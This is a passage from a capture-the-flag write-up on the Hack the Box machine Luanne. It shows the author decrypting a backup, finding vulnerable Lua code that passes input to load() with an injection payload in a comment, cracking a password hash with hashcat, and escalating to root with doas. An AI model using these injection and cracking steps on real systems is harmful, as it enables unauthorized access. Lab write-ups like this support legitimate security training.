</pre></table></code></div></div><p>looks like 2048 bit rsa key</p><ul><li><a href="https://man.netbsd.org/tar.1">https://man.netbsd.org/tar.1</a><li><a href="https://netbsd-users.netbsd.narkive.com/ZatFbpGV/tar-how-does-it-work">https://netbsd-users.netbsd.narkive.com/ZatFbpGV/tar-how-does-it-work</a></ul><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc | tar -xzf - -C /tmp/     
signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
uid              RSA 2048-bit key &lt;r.michaels@localhost&gt;
</pre></table></code></div></div><p>success</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>luanne$ ls -ls /tmp
total 8
8 drwxr-x---  4 r.michaels  wheel  96 Sep 16  2020 devel-2020-09-16
luanne$ cd /tmp/devel-2020-09-16/                                                                     
luanne$ ls -la
total 32
drwxr-x---  4 r.michaels  wheel  96 Sep 16  2020 .
drwxrwxrwt  3 root        wheel  48 Mar 28 04:02 ..
drwxr-xr-x  2 r.michaels  wheel  48 Sep 16  2020 webapi
drwxr-xr-x  2 r.michaels  wheel  96 Sep 16  2020 www
</pre></table></code></div></div><p>I was able to successfully extract the files, but right after I started to look through them the <code class="language-plaintext highlighter-rouge">/tmp</code> directory was cleaned up.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>luanne$ ls -la
total 20
drwxrwxrwt   3 root        wheel   48 Mar 28 04:04 .
drwxr-xr-x  21 root        wheel  512 Sep 16  2020 ..
drwxr-x---   4 r.michaels  wheel   96 Sep 16  2020 devel-2020-09-16
luanne$ cd devel-2020-09-16/                                                                          
luanne$ ls -la
total 32
drwxr-x---  4 r.michaels  wheel  96 Sep 16  2020 .
drwxrwxrwt  3 root        wheel  48 Mar 28 04:04 ..
drwxr-xr-x  2 r.michaels  wheel  48 Sep 16  2020 webapi
drwxr-xr-x  2 r.michaels  wheel  96 Sep 16  2020 www
luanne$ cd www
luanne$ ls -la
total 32
drwxr-xr-x  2 r.michaels  wheel   96 Sep 16  2020 .
drwxr-x---  4 r.michaels  wheel   96 Sep 16  2020 ..
-rw-r--r--  1 r.michaels  wheel   47 Sep 16  2020 .htpasswd
-rw-r--r--  1 r.michaels  wheel  378 Sep 16  2020 index.html
luanne$ cat .htpasswd                                                                                 
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
</pre></table></code></div></div><p>I noticed that this hash was different from the one I had cracked earlier.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>luanne$ cat index.html                                                                                
&lt;!doctype html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Index&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;p&gt;&lt;h3&gt;Weather Forecast API&lt;/h3&gt;&lt;/p&gt;
    &lt;p&gt;&lt;h4&gt;List available cities:&lt;/h4&gt;&lt;/p&gt;
    &lt;a href="/webapi/weather?city=list"&gt;/webapi/weather?city=list&lt;/a&gt;
    &lt;p&gt;&lt;h4&gt;Five day forecast (London)&lt;/h4&gt;&lt;/p&gt;
    &lt;a href="/webapi/weather?city=London"&gt;/webapi/weather?city=London&lt;/a&gt;
    &lt;hr&gt;
  &lt;/body&gt;
&lt;/html&gt;
</pre></table></code></div></div><p>This <code class="language-plaintext highlighter-rouge">index.html</code> was the same as the <code class="language-plaintext highlighter-rouge">/forecast</code> site I had seen earlier, however.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>luanne$ cd ../webapi/                                                                                 
luanne$ ls -la
total 32
drwxr-xr-x  2 r.michaels  wheel    48 Sep 16  2020 .
drwxr-x---  4 r.michaels  wheel    96 Sep 16  2020 ..
-rw-r--r--  1 r.michaels  wheel  7072 Sep 16  2020 weather.lua
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">webapi</code> folder only contained the file <code class="language-plaintext highlighter-rouge">weather.lua</code></p><div class="language-lua highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
</pre><td class="rouge-code"><pre><span class="n">luanne</span><span class="err">$</span> <span class="n">cat</span> <span class="n">weather</span><span class="p">.</span><span class="n">lua</span>                                                                               
<span class="n">httpd</span> <span class="o">=</span> <span class="nb">require</span> <span class="s1">'httpd'</span>
<span class="n">math</span> <span class="o">=</span> <span class="nb">require</span> <span class="s1">'math'</span>
<span class="n">sqlite</span> <span class="o">=</span> <span class="nb">require</span> <span class="s1">'sqlite'</span>

<span class="n">cities</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"London"</span><span class="p">,</span> <span class="s2">"Manchester"</span><span class="p">,</span> <span class="s2">"Birmingham"</span><span class="p">,</span> <span class="s2">"Leeds"</span><span class="p">,</span> <span class="s2">"Glasgow"</span><span class="p">,</span> <span class="s2">"Southampton"</span><span class="p">,</span> <span class="s2">"Liverpool"</span><span class="p">,</span> <span class="s2">"Newcastle"</span><span class="p">,</span> <span class="s2">"Nottingham"</span><span class="p">,</span> <span class="s2">"Sheffield"</span><span class="p">,</span> <span class="s2">"Bristol"</span><span class="p">,</span> <span class="s2">"Belfast"</span><span class="p">,</span> <span class="s2">"Leicester"</span><span class="p">}</span>

<span class="n">weather_desc</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"sunny"</span><span class="p">,</span> <span class="s2">"cloudy"</span><span class="p">,</span> <span class="s2">"partially cloudy"</span><span class="p">,</span> <span class="s2">"rainy"</span><span class="p">,</span> <span class="s2">"snowy"</span><span class="p">}</span>


<span class="k">function</span> <span class="nf">valid_city</span><span class="p">(</span><span class="n">cities</span><span class="p">,</span> <span class="n">city</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">v</span> <span class="k">in</span> <span class="nb">ipairs</span><span class="p">(</span><span class="n">cities</span><span class="p">)</span> <span class="k">do</span>
        <span class="k">if</span> <span class="n">v</span> <span class="o">==</span> <span class="n">city</span>
        <span class="k">then</span>
            <span class="k">return</span> <span class="kc">true</span>
        <span class="k">end</span>
    <span class="k">end</span>
    <span class="k">return</span> <span class="kc">false</span>
<span class="k">end</span>


<span class="k">function</span> <span class="nf">forecast</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">headers</span><span class="p">,</span> <span class="n">query</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">query</span> <span class="ow">and</span> <span class="n">query</span><span class="p">[</span><span class="s2">"city"</span><span class="p">]</span>
    <span class="k">then</span>
        <span class="kd">local</span> <span class="n">city</span> <span class="o">=</span> <span class="n">query</span><span class="p">[</span><span class="s2">"city"</span><span class="p">]</span>
        <span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"list"</span>
        <span class="k">then</span> 
            <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"HTTP/1.1 200 Ok\r\n"</span><span class="p">)</span>
            <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"Content-Type: application/json\r\n\r\n"</span><span class="p">)</span>
            <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s1">'{"code": 200,'</span><span class="p">)</span>
            <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s1">'"cities": ['</span><span class="p">)</span>
            <span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">v</span> <span class="k">in</span> <span class="nb">pairs</span><span class="p">(</span><span class="n">cities</span><span class="p">)</span> <span class="k">do</span>
                <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s1">'"'</span> <span class="o">..</span> <span class="n">v</span> <span class="o">..</span> <span class="s1">'"'</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="o">#</span><span class="n">cities</span>
                <span class="k">then</span>
                    <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s1">','</span><span class="p">)</span>
                <span class="k">end</span>
            <span class="k">end</span>
            <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s1">']}'</span><span class="p">)</span>
        <span class="k">elseif</span> <span class="ow">not</span> <span class="n">valid_city</span><span class="p">(</span><span class="n">cities</span><span class="p">,</span> <span class="n">city</span><span class="p">)</span>
        <span class="k">then</span>
            <span class="c1">-- city=London') os.execute('id') --</span>
            <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"HTTP/1.1 500 Error\r\n"</span><span class="p">)</span>
            <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"Content-Type: application/json\r\n\r\n"</span><span class="p">)</span>
            <span class="kd">local</span> <span class="n">json</span> <span class="o">=</span> <span class="nb">string.format</span><span class="p">(</span><span class="s">[[
                httpd.write('{"code": 500,')
                httpd.write('"error": "unknown city: %s"}')
            ]]</span><span class="p">,</span> <span class="n">city</span><span class="p">)</span>

            <span class="nb">load</span><span class="p">(</span><span class="n">json</span><span class="p">)()</span>
        <span class="k">else</span>
            <span class="c1">-- just some fake weather data</span>

            <span class="o">...</span><span class="n">snipped</span><span class="o">...</span>

        <span class="k">end</span> 
    <span class="k">else</span>
        <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"HTTP/1.1 200 Ok\r\n"</span><span class="p">)</span>
        <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"Content-Type: application/json\r\n\r\n"</span><span class="p">)</span>
        <span class="n">httpd</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s1">'{"code": 200, "message": "No city specified. Use \'</span><span class="n">city</span><span class="o">=</span><span class="n">list</span><span class="err">\</span><span class="s1">' to list available cities."}'</span><span class="p">)</span>
    <span class="k">end</span>
<span class="k">end</span>

<span class="n">httpd</span><span class="p">.</span><span class="n">register_handler</span><span class="p">(</span><span class="s1">'forecast'</span><span class="p">,</span> <span class="n">forecast</span><span class="p">)</span>
</pre></table></code></div></div><p>Nothing useful here? There did seem to be a backdoor potentially written in, though it was commented out <code class="language-plaintext highlighter-rouge">-- city=London') os.execute('id') --</code>. I think this is where I injected my original access</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/luanne]
└─$ echo 'webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.' &gt;&gt; hash                                130 ⨯

┌──(zweilos㉿kali)-[~/htb/luanne]
└─$ hashcat -O -D1,2 -a0 -m500 hash /usr/share/wordlists/rockyou.txt --username
hashcat (v6.1.1) starting...

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

INFO: Removed 1 hash found in potfile.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.:littlebear    

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: hash
Time.Started.....: Sat Mar 27 23:58:52 2021 (1 sec)
Time.Estimated...: Sat Mar 27 23:58:53 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    41505 H/s (11.99ms) @ Accel:512 Loops:250 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests, 2/2 (100.00%) Salts
Progress.........: 26636/28688770 (0.09%)
Rejected.........: 12/26636 (0.05%)
Restore.Point....: 12293/14344385 (0.09%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidates.#1....: gamboa -&gt; billybob1

Started: Sat Mar 27 23:58:51 2021
Stopped: Sat Mar 27 23:58:54 2021
</pre></table></code></div></div><p>The hash cracked almost immediately, finding a password of <code class="language-plaintext highlighter-rouge">littlebear</code></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>luanne$ doas whoami
Password:
root
</pre></table></code></div></div><p>I was able to run commands with <code class="language-plaintext highlighter-rouge">doas</code> with this password!</p><h3 id="roottxt">Root.txt</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>luanne$ doas su
Password:
# cd /root
# ls -la
total 36
drwxr-xr-x   2 root  wheel   512 Nov 24 09:30 .
drwxr-xr-x  21 root  wheel   512 Sep 16  2020 ..
-r--r--r--   2 root  wheel  1220 Feb 14  2020 .cshrc
-rw-------   1 root  wheel    59 Feb 14  2020 .klogin
-rw-r--r--   1 root  wheel   212 Feb 14  2020 .login
-r--r--r--   2 root  wheel   701 Feb 14  2020 .profile
-rw-r--r--   1 root  wheel   221 Feb 14  2020 .shrc
-r-x------   1 root  wheel   178 Nov 24 09:57 cleanup.sh
-r--------   1 root  wheel    33 Sep 16  2020 root.txt
# cat root      
cat: root: No such file or directory
# cat root.txt
7a9b5c206e8e8ba09bb99bd113675f66
# cat cleanup.sh
#!/bin/sh

/usr/bin/find / -name devel_backup-2020-09-16.tar.gz -exec rm -f {} \;
/usr/bin/find / -name devel-2020-09-16 -exec rm -rf {} \;
/usr/bin/find /tmp -exec rm -rf {} \;
</pre></table></code></div></div><p>Note: <code class="language-plaintext highlighter-rouge">/etc/master.passwd</code> is where password hashes are stored in BSD, not /etc/shadow</p><p>Thanks to <a href="https://app.hackthebox.eu/users/159204"><code class="language-plaintext highlighter-rouge">polarbearer</code></a> for something interesting or useful about this machine.</p><p>If you have comments, issues, or other feedback, or have any other fun or useful tips or tricks to share, feel free to contact me on Github at <a href="https://github.com/zweilosec">https://github.com/zweilosec</a> or in the comments below!</p><p>If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&amp;emoji=&amp;slug=zweilosec&amp;button_colour=FFDD00&amp;font_colour=000000&amp;font_family=Lato&amp;outline_colour=000000&amp;coffee_colour=ffffff" /></a></p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a> <a href="/tags/bsd/" class="post-tag no-text-decoration" >bsd</a> <a href="/tags/doas/" class="post-tag no-text-decoration" >doas</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/supervisor/" class="post-tag no-text-decoration" >supervisor</a> <a href="/tags/burp/" class="post-tag no-text-decoration" >burp</a> <a href="/tags/curl/" class="post-tag no-text-decoration" >curl</a> <a href="/tags/lua/" class="post-tag no-text-decoration" >lua</a> <a href="/tags/oscp/" class="post-tag no-text-decoration" >oscp</a> <a href="/tags/tj-null/" class="post-tag no-text-decoration" >tj_null</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/polarbearer/" class="post-tag no-text-decoration" >polarbearer</a> <a href="/tags/unfinished/" class="post-tag no-text-decoration" >unfinished</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - Luanne Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/luanne/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - Luanne Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/luanne/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack the Box - Luanne Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/luanne/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/forwardslash/"><div class="card-body"> <span class="timeago small" > Jun 6, 2020 <i class="unloaded">2020-06-06T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Forwardslash Writeup</h3><div class="text-muted small"><p> HTB - ForwardSlash Overview Useful Skills and Tools Enumeration Nmap scan I started my enumeration with an nmap scan of 10.10.10.183. The options I regularly use are: Flag ...</p></div></div></a></div><div class="card"> <a href="/posts/oouch/"><div class="card-body"> <span class="timeago small" > Jun 11, 2020 <i class="unloaded">2020-06-11T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Oouch Writeup</h3><div class="text-muted small"><p> HTB - Oouch Overview This had difficulty Linux machine taught me a lot about the internal workings of a federated access control system, specifically an implementation of Oauth2. Persistence a...</p></div></div></a></div><div class="card"> <a href="/posts/playertwo/"><div class="card-body"> <span class="timeago small" > Jun 26, 2020 <i class="unloaded">2020-06-26T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - PlayerTwo Writeup</h3><div class="text-muted small"><p> HTB - PlayerTwo Overview An Insane difficulty Linux machine that tested my web skills quite a bit and also had me doing as much research on new protocols and services as three or four easy or m...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/crossfit/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Crossfit Writeup</p></a> <a href="/posts/apt/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - APT Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
